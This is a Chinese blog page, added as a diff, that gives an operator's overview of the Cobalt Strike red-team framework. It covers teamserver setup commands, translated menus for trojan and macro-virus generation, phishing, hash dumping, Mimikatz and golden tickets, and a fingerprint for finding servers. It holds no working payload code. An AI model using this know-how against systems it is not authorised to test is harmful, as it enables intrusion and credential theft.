@@ -1,0 +1,2791 @@
+<!DOCTYPE html>
+<html lang="zn">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    <meta name="description" content="IcMl0x824">
+    <meta name="author" content="IcMl0x24">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-redefine.png">
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2023/03/14/cs/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="红队攻击篇-Cobalt Strike帮助文档&amp;献给渗透测试人员的先进威胁战术(2023年2月9日更新版本)">
+    <meta property="og:description" content="IcMl0x824">
+    <meta property="og:url" content="http://example.com2023/03/14/cs/">
+    
+    <meta property="og:site_name" content="IcMl0x24 &#39;s Blog">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="红队攻击篇-Cobalt Strike帮助文档&amp;献给渗透测试人员的先进威胁战术(2023年2月9日更新版本)">
+    <meta name="twitter:description" content="IcMl0x824">
+    <meta name="twitter:image" content="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303141839090.png">
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303141839090.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303141839090.png">
+    <meta name="theme-color" content="#0066cc">
+    <link rel="shortcut icon" href="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303141839090.png">
+    
+    <title>
+        
+            红队攻击篇-Cobalt Strike帮助文档&amp;献给渗透测试人员的先进威胁战术(2023年2月9日更新版本) -
+        
+        IcMl0x24 &#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/assets/fonts.css">
+
+    
+    
+    
+    <script id="hexo-configurations">
+    let REDEFINE = window.REDEFINE || {};
+    REDEFINE.hexo_config = {"hostname":"example.com","root":"/","language":"zn"};
+    REDEFINE.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","avatar":"https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303141839090.png","favicon":"https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303141839090.png","og_image":{"enable":false,"image_url":null},"article_img_align":"center","right_side_width":"210px","content_max_width":"1000px","nav_color":{"left":"#f78736","right":"#367df7","transparency":35},"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_image":{"light":"https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303142010057.webp","dark":"https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303142010083.webp"},"title_color":{"light":"#fff","dark":"#d1d1b6"},"font_sizes":{"title":"2.8rem","subtitle":"1.5rem"},"line_height":1.2,"title":"春江潮水连海平，海上明月共潮生","subtitle":{"enable":false,"list":[]},"custom_font":{"enable":false,"font_family":null,"font_url":null}},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":false,"preload":true},"code_block":{"copy":true,"style":"mac","custom_font":{"enable":false,"font_family":null,"font_url":null}},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"1.2.1","friend_links":{"columns":2},"home_article":{"date_format":"auto","category":{"enable":true,"limit":3},"tag":{"enable":true,"limit":3}},"plugins":{"aplayer":{"enable":false,"audio":[{"name":null,"artist":null,"url":null,"cover":null},{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}}};
+    REDEFINE.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+    
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="menu-wrapper">
+    
+    <div class="menu-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                IcMl0x24 &#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        
+                            <li class="menu-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="menu-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="menu-drawer">
+        <ul class="drawer-menu-list">
+            
+                
+                    <li class="drawer-menu-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-menu-item flex-center">
+                        <a class="" 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            
+            
+                <div class="article-title">
+                    <h1 class="article-title-regular">红队攻击篇-Cobalt Strike帮助文档&amp;献给渗透测试人员的先进威胁战术(2023年2月9日更新版本)</h1>
+                </div>
+            
+                
+            
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303141839090.png">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">IcMl0x24</span>
+                            
+                                <span class="author-label">Lv1</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="pc">2023-03-14 20:13:23</span>
+        <span class="mobile">2023-03-14 20:13</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="pc">2023-03-14 20:14:10</span>
+            <span class="mobile">2023-03-14 20:14</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Cobalt-Strike/">Cobalt Strike</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081351660.png"
+                     
+                ></p>
+<p>本文参考：官方Cobalt Strike 4.7 手册&amp;Cobalt Strike 4.0 手册—献给渗透测试人员的先进威胁战术(2019年12月2日更新版本)&amp;众多师傅文章资料&amp;网络文献&amp;f8x安全知识框架CS内容，由于无法一一列出，特此鸣谢，本文档旨在概述 Cobalt Strike 的功能集和与其相关的攻击流程，引入较为新颖的技术与理念。本文档中所属转发内容作者&amp;译者众多，感谢诸位师傅的无私奉献与钻研精神。由于本人技术有限，若不可抗力本文内容出现错误，请师傅们及时提醒并指出，以免产生误导。</p>
+<p>编者：猫哥爱吃秋刀鱼-IcMl0X824</p>
+<p>日期：2023-02-09</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[官网]:https://www.cobaltstrike.com/</span><br><span class="line">[FoFa]:cert=&quot;73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F&quot;</span><br><span class="line">[教程]:https://github.com/aleenzz/Cobalt_Strike_wiki</span><br><span class="line">[手册]:https://blog.ateam.qianxin.com</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081202047.png"
+                     
+                ></p>
+<h2 id="Introduce-介绍"><a href="#Introduce-介绍" class="headerlink" title="Introduce-介绍"></a>Introduce-介绍</h2><p>Cobalt Strike 是一个为对手模拟和红队行动而设计的平台，主要用于执行有目标的攻击和模拟高级威胁者的后渗透行动。Cobalt Strike是一款基于java的渗透测试神器，常被业界人称为CS神器。除去自身功能外，Cobalt Strike 还利用了 Metasploit 和 Mimikatz 等其他知名工具的功能。自3.0以后已经不在使用Metasploit框架而作为一个独立的平台使用，分为客户端与服务端，服务端是一个，客户端可以有多个。非常适合团队协同作战，多个攻击者可以同时连接到一个团队服务器上，共享攻击资源与目标信息和会话sessions，可模拟APT做模拟对抗，进行内网渗透。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081219794.png"
+                     
+                ></p>
+<p>Cobalt Strike集成了端口转发、服务扫描，自动化溢出，多模式端口监听，exe木马生成，dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java 执行，浏览器自动攻击等等。</p>
+<h3 id="文章学习"><a href="#文章学习" class="headerlink" title="文章学习"></a>文章学习</h3><ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/column/149236.html" >cobalt strike 快速上手 [ 一 ] - FreeBuf专栏·攻防之路 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.3hack.com/note/96.html" >教你修改cobalt strike的50050端口 - 3HACK <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/ryanohoro/csbruter" >ryanohoro&#x2F;csbruter: Cobalt Strike team server password brute force tool <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://0x20h.com/p/8dee.html" >CS通过CDN上线 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://paper.seebug.org/1190/" >渗透利器 Cobalt Strike 在野利用情况专题分析 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/AePKPUDnBUr4WbJqvPCleg" >为 CobaltStrike TeamServer 加上谷歌二次验证 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://blog.nviso.eu/2021/10/27/cobalt-strike-using-known-private-keys-to-decrypt-traffic-part-2/" >Cobalt Strike: Using Known Private Keys To Decrypt Traffic - Part 2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/AcIFSjyqn9gzyRkyx3sRIQ" >破解版密钥相同，部分CobaltStrike加密流量可解 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+</li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://tttang.com/archive/1789/" >CobaltStrike beacon二开指南 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/i8eBT8O2IwCotf7wqnveEw" >第19篇：关于近期cs服务端被反打的原因分析 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/K47FXTMEWfB_474aHAGU5g" >CobaltStrike4.5 分析总结 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/include_voidmain/article/details/126601834?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-126601834-blog-113826579.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-126601834-blog-113826579.pc_relevant_default&utm_relevant_index=2" >(96条消息) 对云函数隐藏C2技术的防御反制思路_长白山攻防实验室的博客-CSDN博客_反制云函数 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+<h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">agscript            # 拓展应用的脚本</span><br><span class="line">c2lint              # 检查profile的错误异常</span><br><span class="line">cobaltstrike</span><br><span class="line">cobaltstrike.jar    # 客户端程序</span><br><span class="line">icon.jpg</span><br><span class="line">license.pdf</span><br><span class="line">readme.txt</span><br><span class="line">releasenotes.txt</span><br><span class="line">teamserver          # 服务端程序</span><br><span class="line">update</span><br><span class="line">update.jar</span><br><span class="line">third-party         # 第三方工具</span><br><span class="line">    - README.vncdll.txt</span><br><span class="line">    - vncdll.x64.dll</span><br><span class="line">    - vncdll.x86.dll</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="个人定制"><a href="#个人定制" class="headerlink" title="个人定制"></a>个人定制</h3><ol>
+<li><p>Cobalt Strike可以使用 AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等</p>
+</li>
+<li><p>Cobalt Strike通信配置文件是 Malleable C2 你可以修改 CS的通讯特征，Beacon payload的一些行为</p>
+</li>
+<li><p>Cobalt Strike可以引用其他的通讯框架ExternalC2，ExternalC2是由Cobalt Strike提出的一套规范&#x2F;框架，它允许黑客根据需要对框架提供的默认HTTP(S)&#x2F;DNS&#x2F;SMB C2 通信通道进行扩展。</p>
+</li>
+</ol>
+<h3 id="启动运行"><a href="#启动运行" class="headerlink" title="启动运行"></a>启动运行</h3><p>团队服务器运行在Linux平台上，服务端的关键文件是teamserver和cobaltstrike.jar</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver</span><br></pre></td></tr></table></figure></div>
+
+<p>命令说明</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">./teamserver &lt;host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]</span><br><span class="line"></span><br><span class="line">&lt;host&gt;                必需参数 团队服务器IP</span><br><span class="line">&lt;password&gt;            必需参数 连接服务器的密码</span><br><span class="line">[/path/to/c2.profile] 可选参数 指定C2通信配置文件，体现其强大的扩展性</span><br><span class="line">[YYYY-MM-DD]          可选参数 所有payload的终止时间</span><br><span class="line"></span><br><span class="line">启动Team Server</span><br><span class="line">./teamserver IP 密码   设置强密码，否则容易被爆破，参考附录</span><br></pre></td></tr></table></figure></div>
+
+<p>如果没有权限运行，使用命令设置权限，但是终端一旦关闭了，teamserver就会自动关掉 ，我们可以使用nohup命令设置后台挂起运行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./teamserver IP 123456 &amp;</span><br></pre></td></tr></table></figure></div>
+
+<p>默认的监听端口是50055，可以通过修改teamserver文件里的端口信息，改变默认端口。第一次连接会有指纹提示，客户端每次连接都会自动保存配置文件，可以在偏好设置中删除没用的连接信息。</p>
+<p>客户端 cobaltstrike 运行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -jar cobaltstrike.jar</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="翻译参考"><a href="#翻译参考" class="headerlink" title="翻译参考"></a>翻译参考</h3><h4 id="Cobalt-Strike-钴元素打击"><a href="#Cobalt-Strike-钴元素打击" class="headerlink" title="Cobalt Strike 钴元素打击"></a>Cobalt Strike 钴元素打击</h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081554600.png"
+                     
+                ></p>
+<ul>
+<li>New Connection        新建连接，支持连接多个服务器端</li>
+<li>Preferences	            设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录</li>
+<li>Visualization               主要展示输出结果的视图</li>
+<li>VPN Interfaces           设置VPN接口</li>
+<li>Listenrs	                   创建监听器</li>
+<li>Script Manager          脚本管理，可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，</li>
+<li>Beacon                        命令行，提权脚本等</li>
+<li>Close	                        退出连接</li>
+</ul>
+<h4 id="View-视图"><a href="#View-视图" class="headerlink" title="View 视图"></a>View 视图</h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081555230.png"
+                     
+                ></p>
+<ul>
+<li>Application           应用程序</li>
+<li>Password Credentials  密码凭证</li>
+<li>Download List         下载列表</li>
+<li>Event log             事件日志</li>
+<li>Keylogger             键盘记录</li>
+<li>Proxy forwarding      代理转发</li>
+<li>Screenshot            屏幕截图</li>
+<li>Script Console        脚本控制台</li>
+<li>Target list           目标列表</li>
+<li>Web logs              Web日志</li>
+</ul>
+<h4 id="ATTacks-攻击"><a href="#ATTacks-攻击" class="headerlink" title="ATTacks 攻击"></a>ATTacks 攻击</h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081555335.png"
+                     
+                ></p>
+<h5 id="Packages-后门"><a href="#Packages-后门" class="headerlink" title="Packages 后门"></a>Packages 后门</h5><ol>
+<li>HTML Application                 生成(executable&#x2F;VBA&#x2F;powershell)这三种原理实现的恶意HTA木马文件</li>
+<li>MS Office Macro                  生成office宏病毒文件</li>
+<li>Payload Generator                生成各种语言版本的payload </li>
+<li>USB&#x2F;CD AutoPlay                  生成利用自动播放运行的木马文件</li>
+<li>Windows Dropper                  捆绑器能够对任意的正常文件进行捆绑(免杀效果差) </li>
+<li>Windows Executable               生成可执行exe木马</li>
+<li>Windows Executable(Stageless)	生成无状态的可执行exe木马</li>
+</ol>
+<h5 id="Web-Drive-by"><a href="#Web-Drive-by" class="headerlink" title="Web Drive-by"></a>Web Drive-by</h5><ol>
+<li>Manage	                对开启的web服务进行管理</li>
+<li>Clone Site	            克隆网站，可以记录受害者提交的数据</li>
+<li>Host File	             提供文件下载，可以选择Mime类型</li>
+<li>Scripted Web Delivery	 为payload提供web服务以便下载和执行</li>
+<li>Signed Applet Attack	  使用java自签名的程序进行钓鱼攻击</li>
+<li>Smart Applet Attack	   自动检测java版本并进行攻击</li>
+<li>System Profiler	       用来获取系统信息，如系统版本，Flash版本，浏览器版本等</li>
+</ol>
+<h5 id="Spear-Phish"><a href="#Spear-Phish" class="headerlink" title="Spear Phish"></a>Spear Phish</h5><p>钓鱼邮件攻击</p>
+<h4 id="menu-右键菜单"><a href="#menu-右键菜单" class="headerlink" title="menu 右键菜单"></a>menu 右键菜单</h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081556607.png"
+                     
+                ></p>
+<ul>
+<li>Interact        打开beacon</li>
+<li>Access<ul>
+<li>​	dump hashes     获取 hash</li>
+<li>​	Elevate          提权</li>
+<li>​	Golden Ticket    生成黄金票据注入当前会话</li>
+<li>​	MAke token       凭证转换</li>
+<li>​    One-liner        使用 PowerShell 单行程序来派生会话</li>
+<li>​	Run Mimikatz     运行 Mimikatz</li>
+<li>​	Spawn As         用其他用户生成 Cobalt Strike 侦听器</li>
+</ul>
+</li>
+<li>Explore<ul>
+<li>​	Browser Pivot    劫持目标浏览器进程</li>
+<li>​	Desktop(VNC)    桌面交互</li>
+<li>​	File Browser     文件浏览器</li>
+<li>​	Net View         命令Net View</li>
+<li>​	Port scan        端口扫描</li>
+<li>​	Process list    进程列表</li>
+<li>​	Screenshot      截图</li>
+</ul>
+</li>
+<li>Pivoting<ul>
+<li>​	SOCKS Server     代理服务</li>
+<li>​	Listener..      反向端口转发</li>
+<li>​	Deploy VPN      部署VPN</li>
+</ul>
+</li>
+<li>Spawn           新的通讯模式并生成会话</li>
+<li>Session          会话管理，删除，心跳时间，退出，备注<ul>
+<li>​    Note…          设置注释</li>
+<li>​    Color           设置会话颜色</li>
+<li>​    Remove           删除会话</li>
+<li>​    Sleep            会话休眠</li>
+<li>​    Exit             退出会话</li>
+</ul>
+</li>
+</ul>
+<h4 id="Reporting-报告"><a href="#Reporting-报告" class="headerlink" title="Reporting 报告"></a>Reporting 报告</h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081555565.png"
+                     
+                ></p>
+<ol>
+<li><p>Activity Report	</p>
+<ul>
+<li>活动报告</li>
+</ul>
+</li>
+<li><p>Hosts Report	     </p>
+<ul>
+<li>主机报告</li>
+</ul>
+</li>
+<li><p>Indicators of Compromise   </p>
+<ul>
+<li>IOC报告：包括C2配置文件的流量分析、域名、IP和上传文件的MD5 hashes</li>
+</ul>
+</li>
+<li><p>Sessions Report	        </p>
+<ul>
+<li>会话报告</li>
+</ul>
+</li>
+<li><p>Social Engineering Report  </p>
+<ul>
+<li>社会工程报告：包括鱼叉钓鱼邮件及点击记录</li>
+</ul>
+</li>
+<li><p>Tactics, Techniques, and Procedures</p>
+<ul>
+<li>战术技术及相关程序报告：包括行动对应的每种战术的检测策略和缓解策略</li>
+</ul>
+</li>
+<li><p>Reset Data	</p>
+<ul>
+<li><p>清空数据</p>
+</li>
+<li><p>&#96;&#96;&#96;<br>Cobalt Strike 的数据模型将其所有的状态和状态元数据存储在 data&#x2F; 文件夹。 data&#x2F; 文件夹存在在你运行 Cobalt Strike 团队服务器的那个文件夹里。<br>要清除 Cobalt Strike 的数据模型：停止团队服务器，删除 data&#x2F; 文件夹及其内容。当你下次启动团队服务器的时候，Cobalt Strike 会重建 data&#x2F; 文件夹。<br>如果你想要存档数据模型，请停止团队服务器，然后使用你喜欢的程序来将 data&#x2F; 文件夹及其文件存储在其他位置。要还原数据模型，请停止团队服务器，然后将旧内容还原到 data&#x2F; 文件夹。通过 Reporting → Reset Data 可以在不重启团队服务器的情况下重置 Cobalt Strike 的数据模型。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">8. Export Data   </span><br><span class="line"></span><br><span class="line">   - 导出数据</span><br><span class="line"></span><br><span class="line">   - ```</span><br><span class="line">     如果你想导出 Cobalt Strike 的数据，通过 Reporting → Export Data 。Cobalt Strike 提供两种选项：把数据导出为 TSV 或 XML 文件。Cobalt Strike 客户端的导出数据功能会融合来自你当前连接的所有团队服务器的数据</span><br></pre></td></tr></table></figure></div></li>
+</ul>
+</li>
+</ol>
+<h4 id="Help-帮助"><a href="#Help-帮助" class="headerlink" title="Help 帮助"></a>Help 帮助</h4><ol>
+<li>Homepage            官方主页</li>
+<li>Support             技术支持</li>
+<li>Arsenal             武器库</li>
+<li>System information  系统信息</li>
+<li>About	           关于</li>
+</ol>
+<h4 id="Toolbar-工具栏"><a href="#Toolbar-工具栏" class="headerlink" title="Toolbar 工具栏"></a>Toolbar 工具栏</h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302072103946.png"
+                     
+                ></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1.新建连接</span><br><span class="line">2.断开当前连接</span><br><span class="line">3.监听器</span><br><span class="line">4.改变视图为Pivot Graph(视图列表) </span><br><span class="line">5.改变视图为Session Table(会话列表) </span><br><span class="line">6.改变视图为Target Table(目标列表) </span><br><span class="line">7.显示所有以获取的受害主机的凭证</span><br><span class="line">8.查看已下载文件</span><br><span class="line">9.查看键盘记录结果</span><br><span class="line">10.查看屏幕截图</span><br><span class="line">11.生成无状态的可执行exe木马</span><br><span class="line">12.使用java自签名的程序进行钓鱼攻击13.生成office宏病毒文件</span><br><span class="line">14.为payload提供web服务以便下载和执行15.提供文件下载，可以选择Mime类型</span><br><span class="line">16.管理Cobalt Strike上运行的web服务17.帮助</span><br><span class="line">18.关于</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="Online-reminder-上线提醒"><a href="#Online-reminder-上线提醒" class="headerlink" title="Online reminder 上线提醒"></a>Online reminder 上线提醒</h4><ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/321010.html" >实现CobaltStrike上线短信提醒 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://hackergu.com/cobaltstrike-wechat-alert/" >CobaltStrike-机器上线微信提醒 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="http://www.nmd5.com/posts/2020-04-20-22/" >Cobalt Strike 上线微信提醒 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10698" >Cobalt Strike的多种上线提醒方法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/evi1ox/cobalt_strike_bot" >evi1ox&#x2F;cobalt_strike_bot <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - CS上线提醒项目</li>
+</ul>
+<h4 id="visualization-可视化"><a href="#visualization-可视化" class="headerlink" title="visualization 可视化"></a>visualization 可视化</h4><p>Cobalt Strike 有多种可视化展示，这些不同的设计是为了帮助你的行动中的不同部分。你可以通过工具条或 Cobalt Strike → Visualization （可视化）菜单在不同的可视化形式之间切换。每一个 Beacon 会话都有一个对应的图标。和会话表中一样，每个主机的图标标识了它的操作系统。如果图标是红色的、并且带有闪电，那么表示此 Beacon 运行在管理员权限的进程中。一个褪色的图标说明此 Beacon 会话被要求离开并且它接受了此命令。</p>
+<p>防火墙图标代表你 Beacon payload 的流量出口点。绿色虚线表示使用了 HTTP 或 HTTPS 连接出网。黄色虚线表示使用 DNS 协议出网。</p>
+<p>从一个 Beacon 会话连接到另一个 Beacon 会话的箭头表示两个 Beacon 之间存在连接。在这种对等通信模式中，Cobalt Strike 的 Beacon 使用 Windows 命名管道和 TCP sockets 来控制其他的Beacon。</p>
